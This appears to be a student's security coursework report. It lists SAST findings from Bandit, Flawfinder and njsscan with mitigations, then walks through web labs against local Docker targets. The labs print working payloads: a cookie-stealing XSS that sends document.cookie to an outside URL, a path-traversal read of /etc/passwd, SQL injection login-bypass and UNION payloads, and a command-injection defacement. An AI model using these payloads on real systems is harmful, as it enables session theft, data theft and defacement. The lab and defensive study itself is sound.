# Vulnerability Scanning Report

## Author: Muhibullo Khujabekov (CS-02)

---

## Task 1 - SAST Tools

### 1. Bandit (Python)

#### Findings:
- **High Severity:**
  ```bash
  >> Issue: [B201:flask_debug_true] A Flask app appears to be run with debug=True, which exposes the Werkzeug debugger and allows the execution of arbitrary code.
     Severity: High   Confidence: Medium
     CWE: CWE-94 (https://cwe.mitre.org/data/definitions/94.html)
     More Info: https://bandit.readthedocs.io/en/1.8.3/plugins/b201_flask_debug_true.html
     Location: ./bad/vulpy-ssl.py:29:0
     28
     29      app.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))
  ```

- **Medium Severity:**
  ```bash
  >> Issue: [B108:hardcoded_tmp_directory] Probable insecure usage of temp file/directory.
     Severity: Medium   Confidence: Medium
     CWE: CWE-377 (https://cwe.mitre.org/data/definitions/377.html)
     More Info: https://bandit.readthedocs.io/en/1.8.3/plugins/b108_hardcoded_tmp_directory.html
     Location: ./bad/vulpy-ssl.py:29:51
     28
     29      app.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))
  ```

- **Low Severity:**
  ```bash
  >> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'aaaaaaa'
     Severity: Low   Confidence: Medium
     CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
     More Info: https://bandit.readthedocs.io/en/1.8.3/plugins/b105_hardcoded_password_string.html
     Location: ./bad/vulpy.py:16:11
     15      app = Flask('vulpy')
     16      app.config['SECRET_KEY'] = 'aaaaaaa'
  ```

#### Mitigations:
1. **High Severity (B201:flask_debug_true)**
   - **Issue:** Running Flask with `debug=True`.
   - **CWE:** CWE-94
   - **Mitigation:** Disable debug mode in production. Use environment variables to control it.

2. **Medium Severity (B108:hardcoded_tmp_directory)**
   - **Issue:** Insecure usage of temp directory.
   - **CWE:** CWE-377
   - **Mitigation:** Use secure temporary file handling (e.g., Python's `tempfile` module).

3. **Low Severity (B105:hardcoded_password_string)**
   - **Issue:** Hardcoded password.
   - **CWE:** CWE-259
   - **Mitigation:** Store passwords in environment variables or secure configuration files.

---

### 2. Flawfinder (C)

#### Findings:
- **Level 1 Vulnerability:**
  ```bash
  ./linux/imgRead_socket.c:74:  [1] (buffer) read:
    Check buffer boundaries if used in a loop including recursive loops
    (CWE-120, CWE-20).
  ```

- **Level 2 Vulnerability:**
  ```bash
  ./linux/imgRead_socket.c:131:  [2] (buffer) memcpy:
    Does not check for buffer overflows when copying to destination (CWE-120).
    Make sure destination can always hold the source data.
  ```

#### Mitigations:
1. **Level 1 Vulnerability**
   - **Issue:** Use of `read()` without checking buffer boundaries.
   - **CWE:** CWE-120 (Buffer Copy without Checking Size of Input)
   - **Mitigation:** Ensure that the buffer size is checked before reading data into it. Limit the amount of data read to the size of the buffer to prevent overflows.

2. **Level 2 Vulnerability**
   - **Issue:** Use of `memcpy()` without checking for buffer overflows.
   - **CWE:** CWE-120 (Buffer Copy without Checking Size of Input)
   - **Mitigation:** Verify that the destination buffer is large enough to hold the source data before performing the copy. Use functions like `memcpy_s()` if available, which include bounds checking.

3. **Level 3 Vulnerability**
   - **Issue:** Not found.

4. **False-positive finding**
    ```bash
    struct Image
    {
	char header[4];
	int width;
	int height;
	char data[10];
    };
    ```
    This code snippet from `dvcp.c` can be false-positive if the `data` field in the `Image` structure is guaranteed to never exceed 10 characters in the actual use case, the buffer overflow concern might be a false positive 

---

### 3. njsscan (NodeJS)

#### Findings:
- **ERROR Severity:**
  ```html
  RULE ID	node_deserialize
  CWE	CWE-502: Deserialization of Untrusted Data
  OWASP-WEB	A8: Insecure Deserialization
  DESCRIPTION	User controlled data in 'unserialize()' or 'deserialize()' function can result in Object Injection or Remote Code Injection.
  SEVERITY	ERROR
  FILES	
  File	core/appHandler.js
  Match Position	18 - 81
  Line Number(s)	218
  Match String	
              var products = serialize.unserialize(req.files.products.data.toString('utf8'))
  ```

- **WARNING Severity:**
  ```html
  RULE ID	sequelize_tls
  CWE	CWE-319: Cleartext Transmission of Sensitive Information
  OWASP-WEB	A6: Security Misconfiguration
  DESCRIPTION	The Sequelize connection string indicates that database server does not use TLS. Non TLS connections are susceptible to man in the middle (MITM) attacks.
  SEVERITY	WARNING
  FILES	
  File	config/db.js
  Match Position	18 - 2
  Line Number(s)	1: 8
  Match String	
  module.exports = {
    username: process.env.MYSQL_USER,
    password: process.env.MYSQL_PASSWORD,
    database: process.env.MYSQL_DATABASE,
    host: process.env.MYSQL_HOST || 'mysql-db',
    port: process.env.MYSQL_PORT || 3306,
    dialect: 'mysql'
  }
  ```

- **INFO Severity:**
  ```html
  RULE ID	cookie_session_default
  CWE	CWE-522: Insufficiently Protected Credentials
  OWASP-WEB	A2: Broken Authentication
  DESCRIPTION	Consider changing the default session cookie name. An attacker can use it to fingerprint the server and target attacks accordingly.
  SEVERITY	INFO
  FILES	
  File	server.js
  Match Position	9 - 3
  Line Number(s)	23: 28
  Match String	
  app.use(session({
    secret: 'keyboard cat',
    resave: true,
    saveUninitialized: true,
    cookie: { secure: false }
  }))
  ```

#### Mitigations:
1. **ERROR Severity Finding**
   - **Issue:** Deserialization of Untrusted Data
   - **CWE:** CWE-502
   - **OWASP:** A8: Insecure Deserialization
   - **Mitigation:** Avoid deserializing untrusted data. If deserialization is necessary, implement strict validation and sanitization of the input data.

2. **WARNING Severity Finding**
   - **Issue:** Cleartext Transmission of Sensitive Information
   - **CWE:** CWE-319
   - **OWASP:** A6: Security Misconfiguration
   - **Mitigation:** Ensure that the database connection uses TLS to encrypt data in transit.

3. **INFO Severity Finding**
   - **Issue:** Insufficiently Protected Credentials
   - **CWE:** CWE-522
   - **OWASP:** A2: Broken Authentication
   - **Mitigation:** Change the default session cookie name to a unique, non-default value.

---

## Task 2 - Web Security Mini Labs

### 2.1 Cross Site Scripting (XSS)
```bash
docker run -p 127.0.0.1:5000:5000 sh3b0/vuln:xss
```
- **Simple Alert:**
  ```xss
  <script>alert('<Muhibullo> XSS');</script>
  ```
  ![Simple Alert](https://i.ibb.co/v40Mgyzm/Screenshot-2025-03-04-184414.png)

- **Redirect User:**
  ```xss
  <script>window.location='https://t.me/QWERTY_5999';</script>
  ```
  ![Redirect User](https://i.ibb.co/Mkp61WY8/Screenshot-2025-03-04-185027.png)

- **Steal Cookies:**
  ```xss
  <script>document.location='https://t.me/QWERTY_5999?cookie='+document.cookie;</script>
  ```
  ![Steal Cookies](https://i.ibb.co/0SpXpFK/Screenshot-2025-03-04-185727.png)

- **DOM-Based XSS:**
  ```xss
  <img src="x" onerror="alert('XSS')">
  ```
  ![DOM-Based XSS](https://i.ibb.co/yBPt6XSP/Screenshot-2025-03-04-190001.png)

- **Exploit URL Parameters:**
  ```xss
  http://google.com/search?q=<script>alert('XSS');</script>
  ```
  ![Exploit URL Parameters](https://i.ibb.co/v6mvF2j3/Screenshot-2025-03-04-190605.png)


### **Why XSS is Dangerous**  
Imagine you’re browsing a website, and suddenly it starts acting weird—maybe it steals your login session or redirects you to a shady page. That’s what XSS (Cross-Site Scripting) does. Attackers sneak malicious scripts into websites, and when you visit, those scripts run in your browser. This can lead to stolen cookies, hijacked accounts, or even malware being downloaded to your device. To stop this, websites need to clean up user inputs, use security policies like CSP, and rely on frameworks that block these sneaky scripts.

---


### 2.2 Path Traversal
```bash
docker run -p 127.0.0.1:5000:5000 sh3b0/vuln:path-traversal
```

- **Payload:** `../../../etc/passwd`
  ![Path Traversal](https://i.ibb.co/twtkT72J/2025-03-04-233242.png)

- **Result:**
  ![Result](https://i.ibb.co/6c1N3nmS/2025-03-04-232918.png)

- **Server Output:**
  ![Server Output](https://i.ibb.co/BV95VDj3/2025-03-04-233400.png)

### **Why Path Traversal is Dangerous**  
Think of a website’s file system like a locked filing cabinet. Path traversal is when an attacker finds a way to pick the lock and access files they shouldn’t—like sensitive configuration files or passwords. It’s like someone rummaging through your private documents. To prevent this, developers need to carefully control how file paths are handled, use allowlists to restrict access, and make sure user input can’t be used to navigate the file system.

---

### 2.3 SQL Injection
```bash
docker run -p 127.0.0.1:5000:5000 sh3b0/vuln:sql-injection
```

- **Basic Payload:** `' OR '1'='1`
  ![Basic Payload](https://i.ibb.co/2GfjBmV/2025-03-04-234314.png)

- **Retrieve Admin Credentials:** `1 UNION SELECT * FROM users`
  ![Retrieve Admin Credentials](https://i.ibb.co/60hNhTRz/2025-03-04-234949.png)

- **Repeater Check:**
  ![Repeater Check](https://i.ibb.co/bgBMzkTZ/2025-03-04-235051.png)

- **Result:**
  ![Result](https://i.ibb.co/NdqQ0zjF/2025-03-04-233956.png)

- **Server Output:**
  ![Server Output](https://i.ibb.co/5gZqvYtV/2025-03-04-235414.png)

### **Why SQL Injection is Dangerous**  
Databases are the backbone of most websites, storing everything from user info to payment details. SQL Injection is like tricking the database into giving up its secrets or even letting attackers mess with the data. Imagine someone logging into your account without a password or deleting entire tables of data. To avoid this, developers should use secure coding practices like prepared statements, ORM frameworks, and strict input validation to keep attackers out.

---

### 2.4 File Upload
```bash
docker run -p 127.0.0.1:5000:5000 sh3b0/vuln:file-upload
```

- **Intercept File Upload:**
  ![Intercept File Upload](https://i.ibb.co/39FvFVwW/2025-03-05-011016.png)

- **Result:**
  ![Result](https://i.ibb.co/d4T6NjfY/2025-03-05-010936.png)

- **Server Output:**
  ![Server Output](https://i.ibb.co/gZ2s5zM4/2025-03-05-011119.png)

### **Why Unrestricted File Upload is Dangerous**  
Let’s say a website lets users upload files without proper checks. An attacker could upload a malicious file disguised as an image or document. Once uploaded, this file could deface the website, spread malware, or even give the attacker control over the server. It’s like letting a stranger drop a bomb in your house. To prevent this, websites should verify file types, enforce server-side checks, limit upload permissions, and store files securely outside the web root.

---

### 2.5 Command Injection
```bash
docker run -p 127.0.0.1:5000:5000 sh3b0/vuln:command-injection
```

- **Payload:** `; sed -i 's/CMD Image resize/You have been hacked/g' templates/index.html;`
  ![Payload](https://i.ibb.co/zWW4MPCx/2025-03-05-022512.png)

- **Result:**
  ![Result](https://i.ibb.co/rG9STvfb/2025-03-05-022609.png)

### **Why Command Injection is Dangerous**  
Command injection is like giving an attacker a remote control to your server. They can run any command they want—delete files, steal data, or even take over the entire system. It’s one of the scariest vulnerabilities because it can lead to complete system compromise. To avoid this, developers should never execute system commands using user input, use safer APIs, and rigorously validate all inputs.

---
